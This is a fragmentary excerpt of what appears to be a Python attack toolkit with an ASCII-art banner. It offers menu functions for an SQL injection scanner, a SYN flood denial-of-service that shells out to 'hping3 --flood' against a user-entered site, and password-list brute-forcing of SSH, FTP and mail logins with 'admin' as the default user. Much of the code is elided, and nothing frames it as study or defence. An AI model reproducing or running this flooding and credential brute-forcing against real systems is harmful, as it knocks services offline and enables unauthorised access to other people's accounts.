...
|  $$$$$$    /$$/ | $$ /$$$$      | $$  | $$ /$$__  $$ /$$__  $$ /$$_____/      | $$$$$$$$|_  $$_/|_  $$_/   |____  $$ /$$_____/| $$  /$$/
 ...
 /$$  \ $$ /$$/   | $$  \ $$      | $$  | $$| $$  | $$| $$  | $$ \____  $$      | $$  | $$  | $$ /$$| $$ /$$ /$$__  $$| $$      | $$_  $$ 
|  $$$$$$//$$/    |  $$$$$$/      | $$$$$$$/|  $$$$$$$|  $$$$$$/ /$$$$$$$/      | $$  | $$  |  $$$$/|  $$$$/|  $$$$$$$|  $$$$$$$| $$ \  $$
 \______/|__/      \______/       |_______/  \_______/ \______/ |_______/       |__/  |__/   \___/   \___/   \_______/ \_______/|__/  \__/
...
def SQL():
	...
	site = input(B+'Jovan»SqlScaner»'+E)
	if "http://" not in site and "https://"not in site:
		site = 'http://' + site
	else:
		pass
...
def Dos():
	...
	banner()
	print('Enter site:')
	site = input(B+'S/G»Dos»'+E)
	print('''Enter level:
		1) High dos
		2) Dos port
 		3) Low dos''')
	level = int(input(B+'S/G»Dos»Level»'+E))
	if level == 1:
		os.system('hping3 -S -P --flood -V '+site)
	if level == 2:
		port = input(B+'S/G»Dos»Level»Port»'+E)
...
def SSH_Brut():
	...
	try:
		...
		host = input(W+'Jovan»SSH»Host»'+E)
		print(G+'Enter username:'+E)
		print(G+'Default: admin'+E)
		user = input(W+'Jovan»SSH»User»'+E)
		if user == "":
			user = 'admin'
		print(G+'Enter password file:'+E)
		password = input(W+'JOVAN»SSH»Password»'+E)
...
def FTP_Brut():
	...
	host = input(W+'TOXIC-JOVAN»Ftp»Host»'+E)
	print(B+'Enter user:'+E)
	print(F+'Default: admin')
	user = input(W+'S/G Jovan»Ftp»User»'+E)
	print(B+'Enter password file:'+E)
	password_list = input(W+'Jovan»Ftp»Password»'+E)
	if user == '':
		user = 'admin'
	if password_list == '':
...
def mail():
	...
	mail = input(W+'Toxic-Jovan»Mail»Login»'+E)
	print(B+'Enter password list:'+E)
	password = input(W+'S/G»Mail»Password»'+E)
	if password == '':
